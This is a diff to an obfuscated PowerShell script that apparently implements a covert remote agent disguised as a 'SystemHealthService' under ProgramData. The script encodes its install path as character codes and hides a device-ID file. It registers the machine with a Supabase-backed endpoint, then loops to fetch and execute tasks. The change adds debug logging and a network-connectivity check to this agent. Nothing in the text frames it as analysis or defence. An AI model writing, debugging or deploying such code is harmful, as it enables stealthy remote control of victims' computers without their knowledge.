@@ -10,21 +10,39 @@ try {
 
 ${_bp} = (-join @([char]67,[char]58,[char]92,[char]80,[char]114,[char]111,[char]103,[char]114,[char]97,[char]109,[char]68,[char]97,[char]116,[char]97,[char]92,[char]83,[char]121,[char]115,[char]116,[char]101,[char]109,[char]72,[char]101,[char]97,[char]108,[char]116,[char]104,[char]83,[char]101,[char]114,[char]118,[char]105,[char]99,[char]101))
 
-while (!(Test-Connection -ComputerName "8.8.8.8" -Count 1 -Quiet)) {
-    Start-Sleep 5
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+$logFile = "${_bp}\agent_debug.log"
+function Write-Log {
+    param($msg)
+    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    "$ts - $msg" | Out-File $logFile -Append -Force
 }
+Write-Log "Agent starting..."
+
+while ($true) {
+    try {
+        $null = Invoke-RestMethod -Uri "https://www.google.com" -Method Head -TimeoutSec 5
+        break
+    } catch {
+        Start-Sleep 5
+    }
+}
+Write-Log "Network check passed"
 Start-Sleep 5
 
 ${_cfg} = Get-Content "${_bp}\config.json" -Raw | ConvertFrom-Json
-${_did}File = "${_bp}\device_id.txt"
+Write-Log "Config loaded: $(${_cfg}.supabase_url)"
+${_dif} = "${_bp}\device_id.txt"
 
-if (Test-Path ${_did}File) {
-    ${_did} = (Get-Content ${_did}File -Raw).Trim()
+if (Test-Path ${_dif}) {
+    ${_did} = (Get-Content ${_dif} -Raw).Trim()
 } else {
     ${_did} = [guid]::NewGuid().ToString()
-    ${_did} | Out-File ${_did}File -NoNewline
-    (Get-Item ${_did}File).Attributes = "Hidden"
+    ${_did} | Out-File ${_dif} -NoNewline
+    (Get-Item ${_dif}).Attributes = "Hidden"
 }
+Write-Log "Device ID: ${_did}"
 
 ${_dn} = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
 
@@ -63,7 +81,9 @@ ${_rd} = @{
     os_info = (Get-CimInstance Win32_OperatingSystem).Caption
 }
 
+Write-Log "Registering device..."
 Invoke-X0g7 -endpoint "devices" -method "POST" -body ${_rd}
+Write-Log "Registration POST sent"
 
 function Get-X0a1 {
     try {
@@ -482,6 +502,7 @@ function Execute-TaskWithTimeout {
 ${_si} = if (${_cfg}.sync_interval) { ${_cfg}.sync_interval } else { 10 }
 ${_ri} = if (${_cfg}.retry_interval) { ${_cfg}.retry_interval } else { 10 }
 
+Write-Log "Entering main loop"
 while ($true) {
     try {
 
